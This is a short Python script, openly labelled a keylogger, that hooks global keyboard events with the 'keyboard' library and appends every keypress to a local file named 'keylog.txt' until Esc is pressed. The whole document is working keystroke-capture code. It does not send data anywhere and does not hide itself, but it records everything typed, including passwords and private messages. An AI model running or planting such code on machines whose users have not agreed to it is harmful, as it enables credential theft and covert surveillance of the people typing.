import keyboard

# File to save the keystrokes
log_file = "keylog.txt"

def on_press(event):
    with open(log_file, 'a') as f:
        if event.name == 'space':
            f.write(' ')
        elif event.name == 'enter':
            f.write('\n')
        elif event.name == 'backspace':
            f.write('[BACKSPACE]')
        else:
            f.write(event.name)

def on_release(event):
    if event.name == 'esc':
        # Stop listener
        return False

# Start the listener
keyboard.on_press(on_press)
keyboard.on_release(on_release)

print("Keylogger started. Press 'esc' to stop.")
keyboard.wait('esc')
